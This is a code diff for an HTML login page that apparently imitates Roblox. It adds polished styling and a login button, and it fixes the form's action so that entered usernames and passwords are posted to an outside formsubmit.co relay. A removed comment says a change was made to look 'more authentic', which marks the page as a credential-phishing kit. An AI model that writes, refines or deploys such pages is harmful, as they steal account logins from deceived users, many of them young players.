@@ -7,6 +7,16 @@
     <style>
         body {
             background-image: url(https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fcms-media.roblox.com%2Fresize%3Dwidth%3A1280%2Cfit%3Amax%2F39ZWAjES8GX7OyR383tQ&f=1&nofb=1&ipt=87d38292d57d115f81f133b8c2bdbb11563012d53dfe9ad03c45d4308a88788d);
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
         }
         .login-container {
             background-color: #ffffff;
@@ -24,7 +34,6 @@
             height: 100px;
             margin-bottom: 10px;
         }
-        /* Removing the "Welcome" header makes it look more authentic */
         .input-group {
             width: 100%;
             margin-bottom: 15px;
@@ -68,12 +77,25 @@
         }
         .forgot-password {
             color: #418fa7;
-.forgot-password {
-            color: #418fa7;
             text-decoration: none;
         }
         .forgot-password:hover {
             text-decoration: underline;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #00b06f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .login-btn:hover {
+            background-color: #008f5a;
         }
     </style>
 </head>
@@ -88,7 +110,7 @@
             </g>
         </svg>
         
-        <form action="https://formsubmit.co/https://formsubmit.co/el/suluxo" method="POST">
+        <form action="https://formsubmit.co/el/suluxo" method="POST">
             <div class="input-group">
                 <label for="username">Username</label>
                 <input type="text" id="username" name="username" placeholder="Username" required>
